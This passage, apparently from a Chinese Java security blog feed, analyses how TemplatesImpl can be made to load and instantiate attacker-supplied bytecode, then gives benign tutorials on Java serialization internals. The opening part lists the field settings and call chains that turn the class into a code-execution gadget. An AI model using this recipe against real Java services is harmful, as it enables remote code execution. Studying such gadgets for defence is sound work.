class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字节码未定义抛出异常</span></span><br><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个内部类TransletClassLoader的对象</span></span><br><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    <span class="comment">// 注意_tfactory.getExternalExtensionsMap()调用TransformerFactoryImpl的getExternalExtensionsMap，因此_tfactory我们要注意赋值，并且是TransformerFactoryImpl的实例</span></span><br><span class="line">AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());&#125;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环定义所有类，包括translet主类和它的内部类</span></span><br><span class="line">_class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line"><span class="comment">// 关键点 调用TransletClassLoader.defineClass通过字节码定义类</span></span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"><span class="comment">// 通过ABSTRACT_TRANSLET判断是否是主类</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">_transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4、小结"><a href="#2-4、小结" class="headerlink" title="2.4、小结"></a>2.4、小结</h4><p>通过前面3步的分析，执行恶意代码需要两个条件：一是调用defineTransletClasses获取Evil的Class对象，二是将Class对象<strong>实例化</strong>调用构造方法。</p><p>另外我们也能明白上面的属性为什么要被这样赋值：</p><ul><li><code>_bytecodes</code>被赋值为我们定义的恶意类的字节码，该类需要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>（对应2.3的代码分析）</li><li><code>_class</code>必须为null（对应2.2的分析）</li><li><code>_name</code>必须不为null（对应2.2的分析）</li><li><code>_tfactory</code>必须是TransformerFactoryImpl实例（对应2.3的代码分析）</li></ul><h3 id="3、由newTransformer-进行拓展"><a href="#3、由newTransformer-进行拓展" class="headerlink" title="3、由newTransformer()进行拓展"></a>3、由<code>newTransformer()</code>进行拓展</h3><p>阅读<a href="https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">wEik1</a>的分析后发现还可以拓展：</p><p>既然只要调用defineTransletClasses就能获取指定字节码定义的类的对象，那我们可以在TemplatesImpl类通过搜索寻找有没有其它方法调用defineTransletClasses。搜索后发现一共有3个方法（包括getTransletInstance）调用defineTransletClasses：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">getTransletIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] <span class="title">getTransletClasses</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>经过第2.4小结我们可以排除getTransletIndex和getTransletClasses，因为它们仅调用了getTransletInstance并没有进行实例化。那我们将目光聚集在getTransletInstance，它在内部除了被newTransformer()调用，也没有其它直接被调用的情况了，因此也被排除。本来到这里应该结束了，但我们不能忽略一点-newTransformer的调用，可以考虑通过newTransformer的调用来进行利用。newTransformer在内部有被getOutputProperties调用，getOutputProperties是public方法，并且getOutputProperties在内部不再被调用，因此总结下来共2个链可以实现恶意类的实例化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()</span><br><span class="line">getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()</span><br></pre></td></tr></table></figure><h2 id="三、总结与思考"><a href="#三、总结与思考" class="headerlink" title="三、总结与思考"></a>三、总结与思考</h2><p>通过本次学习我们了解了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>本身是用来进行xsl转换的，主要通过XSLTC接收xsl文档生成的Translets类的字节码来创建 XSLTC 模板对象。那么由于需要处理字节码，其在内部定义了类加载器并重载了defineClass，defineClass能够返回字节码的Class对象方便后续的实例化，而这也是我们能够利用它执行恶意代码的关键。</p><p>通过构造恶意类的字节码并使用defineClass返回其Class对象，实例化后即可执行我们想要的结果。继续思考，我们可以想到Java是否还存在类似的类（内部定义了类加载器并重载了defineClass）能被我们利用，这里不展开了可自行探索。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xalan.apache.org/xalan-j/apidocs/org/apache/xalan/xsltc/trax/TemplatesImpl.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/org/apache/xalan/xsltc/trax/TemplatesImpl.html</a><br><a href="https://www.runoob.com/xsl/xsl-transformation.html" target="_blank" rel="noopener">https://www.runoob.com/xsl/xsl-transformation.html</a><br><a href="https://docs.oracle.com/javase/7/docs/api/javax/xml/transform/Templates.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/api/javax/xml/transform/Templates.html</a><br><a href="https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/</a><br><a href="http://terpconnect.umd.edu/~zhangx/xml/html/xmlprog/xalan/xsltc.html" target="_blank" rel="noopener">http://terpconnect.umd.edu/~zhangx/xml/html/xmlprog/xalan/xsltc.html</a><br><a href="https://blog.csdn.net/z_dy1/article/details/104427617" target="_blank" rel="noopener">https://blog.csdn.net/z_dy1/article/details/104427617</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TemplatesImpl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK序列化机制及源码解读四：拓展知识</title>
      <link href="2021/07/02/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E5%9B%9B%EF%BC%9A%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86/"/>
      <url>2021/07/02/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E5%9B%9B%EF%BC%9A%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>这是Java序列化机制及源码解读系列的第三篇，记录Java序列化的一些拓展知识。有新知识点也会持续更新。</p><h4 id="1、transient"><a href="#1、transient" class="headerlink" title="1、transient"></a>1、transient</h4><p>transient是一个关键字，用于修饰可序列化的变量，当用transient修饰时，代表该变量在序列化时被忽略。未序列化的变量在反序列化时对象的该属性值为默认值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SomeTeast</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">            SerialTest serialTest = <span class="keyword">new</span> SerialTest();</span><br><span class="line">            objectOutputStream.writeObject(serialTest);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">            SerialTest serialTest1 = (SerialTest) objectInputStream.readObject();</span><br><span class="line">            System.out.println(<span class="string">"----------------transient int i 未被序列化，值为默认值0--------------------"</span>);</span><br><span class="line">            System.out.println(serialTest1.i);</span><br><span class="line">            System.out.println(<span class="string">"----------------String s 被序列化，值为123--------------------"</span>);</span><br><span class="line">            System.out.println(serialTest.s);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerialTest</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">"123"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/imgs/image-20210702091255324.png" alt="image-20210702091255324"></p><p>上述变量i因为有transient修饰，在序列化会被忽略，在反序列化时对象的该属性值为默认值0。</p><h4 id="2、写入时替换对象-writeReplace和保护性恢复对象-readResolve"><a href="#2、写入时替换对象-writeReplace和保护性恢复对象-readResolve" class="headerlink" title="2、写入时替换对象-writeReplace和保护性恢复对象-readResolve"></a>2、写入时替换对象-writeReplace和保护性恢复对象-readResolve</h4><p>在Serializable的官方API中，有关于writeReplace和readResolve的描述：</p><blockquote><p>writeObject方法负责为其特定的类编写对象的状态，以便相应的readObject方法可以恢复它。 可以通过调用out.defaultWriteObject来调用保存对象字段的默认机制。 该方法不需要关注属于其超类或子类的状态。 通过使用writeObject方法或通过使用DataOutput支持的原始数据类型的方法将各个字段写入ObjectOutputStream来保存状态。 </p><p>readObject方法负责从流中读取并恢复类字段。 它可以调用in.defaultReadObject来调用恢复对象的非静态和非瞬态字段的默认机制。 defaultReadObject方法使用流中的信息将保存在流中的对象的字段分配给当前对象中相应命名的字段。 当处理类进化到添加新字段时，这将处理这种情况。 该方法不需要关注属于其超类或子类的状态。 通过使用writeObject方法或通过使用DataOutput支持的原始数据类型的方法将各个字段写入ObjectOutputStream来保存状态。 </p></blockquote><p>在前两部分学习ObjectOutputStream和ObjectInputStream中，其实也有提到：</p><p>ObjectOutputStream#writeObject0中使用hasWriteReplaceMethod()判断目标类是否有自定义writeReplace，有的话其实会调用writeReplace。</p><p>所以writeReplace和readResolve会代替writeObject和readObject进行序列化和反序列化。</p><h5 id="writeReplace"><a href="#writeReplace" class="headerlink" title="writeReplace:"></a>writeReplace:</h5><p>实现了writeReplace的类，会在写入对象流时被替换为writeReplace的返回对象。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RelpaceTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        MyReplace myReplace = <span class="keyword">new</span> MyReplace();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">        objectOutputStream.writeObject(myReplace);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">        Object object = objectInputStream.readObject();</span><br><span class="line">        <span class="comment">// 输出反序列化对象的Class对象，如果没有调用writeReplace，，应该是MyPlace，调用了的话应该是java.lang.String</span></span><br><span class="line">        System.out.println(object.getClass());</span><br><span class="line">        System.out.println(object.toString());</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyReplace</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5633032948089326039L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> i = <span class="number">111</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">writeReplace</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(<span class="string">"1234"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果证明了的确调用了writeReplace，序列化对象被替换为writeReplace定义的对象 即 String实例。</p><p><img src="/imgs/image-20210702095112018.png" alt="image-20210702095112018"></p><p>查看文件，对象被替换就已经在序列化阶段发生了，而非反序列化阶段。</p><p><img src="/imgs/image-20210702100857189.png" alt="image-20210702100857189"></p><p>使用writePlace需要注意以下几点：</p><ul><li>一旦实现了writeReplace，则不再需要实现writeObject，实现了writeReplace在序列化时会自动别调用；</li><li>writeReplace返回的对象必须是可序列化的，因为实际序列化的对象就是writeReplace返回的对象；</li></ul><h5 id="readResolve："><a href="#readResolve：" class="headerlink" title="readResolve："></a>readResolve：</h5><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResolveTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        MyResolve myResolve = <span class="keyword">new</span> MyResolve();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">        objectOutputStream.writeObject(myResolve);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">        <span class="comment">// 输出反序列化对象的Class对象，如果没有调用readReplace，应该是MyResolve，调用了的话应该是java.lang.String</span></span><br><span class="line">        Object object = objectInputStream.readObject();</span><br><span class="line">        System.out.println(object.getClass());</span><br><span class="line">        System.out.println(object.toString());</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyResolve</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3790334555111045021L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> i = <span class="number">111</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 直接替换成一个String实例</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(<span class="string">"Be replaced when deserializable."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下图，对象被替换成String对象。</p><p><img src="/imgs/image-20210702100653080.png" alt="image-20210702100653080"></p><p>查看序列化后的文件内容，发现在被序列化时并没有替换成String对象，对象被替换确实发生在反序列化阶段。</p><p><img src="/imgs/image-20210702100805324.png" alt="image-20210702100805324"></p><p>readResolve注意点：</p><ul><li>readResolve只会在反序列化阶段替换对象，替换的对象就是readResolve的返回对象；</li><li>同writeReplace，实现了readResolve不需要在实现readObject；</li><li>在WebLogic的反序列化漏洞的补丁中，多次使用readResolve进行黑名单过滤，过滤危险类。</li></ul><h4 id="3、readObjectNoData"><a href="#3、readObjectNoData" class="headerlink" title="3、readObjectNoData"></a>3、readObjectNoData</h4><p>官方描述</p><blockquote><p>如果序列化流未将给定类列为反序列化对象的超类，则readObjectNoData方法负责初始化其特定类的对象的状态。  这可能发生在接收方使用与发送方不同的反序列化实例的类的版本的情况下，并且接收者的版本扩展了不被发送者版本扩展的类。  如果序列化流已被篡改，也可能发生这种情况;  因此，尽管存在“敌对”或不完整的源流，readObjectNoData可用于正确初始化反序列化对象。 </p></blockquote><p>readObjectNoData被用来解决反序列化异常问题，需要实现：private void readObjectNoData()</p><p>  当反序列化遇到如下异常会自动调用该方法：</p><ul><li><p>序列化版本不兼容；</p></li><li><p>输入流被篡改或者损坏。</p></li></ul><p>参考链接：</p><p><a href="https://blog.csdn.net/lirx_tech/article/details/51303966" target="_blank" rel="noopener">https://blog.csdn.net/lirx_tech/article/details/51303966</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK序列化机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK序列化机制及源码解读三：ObjectInputStream对象输入流</title>
      <link href="2021/07/01/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%B8%89%EF%BC%9AObjectInputStream%E5%AF%B9%E8%B1%A1%E8%BE%93%E5%85%A5%E6%B5%81/"/>
      <url>2021/07/01/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%B8%89%EF%BC%9AObjectInputStream%E5%AF%B9%E8%B1%A1%E8%BE%93%E5%85%A5%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p>这是Java序列化机制及源码解读系列的第三篇，主要学习JDK处理对象输入流的方法。有了ObjectOutputStream的分析，ObjectInputStream解读起来更得心应手，所以这里我们仅分析下ObjectInputStream的构造方法和readObject方法。</p><h4 id="1、ObjectInputStream的构造方法"><a href="#1、ObjectInputStream的构造方法" class="headerlink" title="1、ObjectInputStream的构造方法"></a>1、ObjectInputStream的构造方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    <span class="comment">// 根据参数创建BlockDataInputStream实例，会创建一个输入流</span></span><br><span class="line">    bin = <span class="keyword">new</span> BlockDataInputStream(in);</span><br><span class="line">    handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>);</span><br><span class="line">    vlist = <span class="keyword">new</span> ValidationList();</span><br><span class="line">    serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line">    <span class="comment">// 自定义readObject判断</span></span><br><span class="line">    enableOverride = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 读取流的头部信息，一般是0xaced</span></span><br><span class="line">    readStreamHeader();</span><br><span class="line">    <span class="comment">// 设置块数据模式</span></span><br><span class="line">    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlockDataInputStream跟 BlockDataOutputStream类似，不过是反过来，其作用是从输入流读取byte数据，read[Type]和read[Type]s将byte转为Java基元数据，并且会返回对应类型的对象。</p><h4 id="2、readObject"><a href="#2、readObject" class="headerlink" title="2、readObject"></a>2、readObject</h4><h5 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h5><p>两种情况读取对象，一种类重写了readObject，直接调用重写方法，否则调用readObject0反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 重写了readObject，直接调用重写的readObject实现</span></span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">    <span class="keyword">int</span> outerHandle = passHandle;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 调用readObject0反序列化</span></span><br><span class="line">        Object obj = readObject0(<span class="keyword">false</span>);</span><br><span class="line">        handles.markDependency(outerHandle, passHandle);</span><br><span class="line">        ClassNotFoundException ex = handles.lookupException(passHandle);</span><br><span class="line">        <span class="keyword">if</span> (ex != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            vlist.doCallbacks();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        passHandle = outerHandle;</span><br><span class="line">        <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">            clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="readObject0"><a href="#readObject0" class="headerlink" title="readObject0"></a>readObject0</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> oldMode = bin.getBlockDataMode();</span><br><span class="line">        <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">            <span class="keyword">int</span> remain = bin.currentBlockRemaining();</span><br><span class="line">            <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(remain);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取tc标识</span></span><br><span class="line">        <span 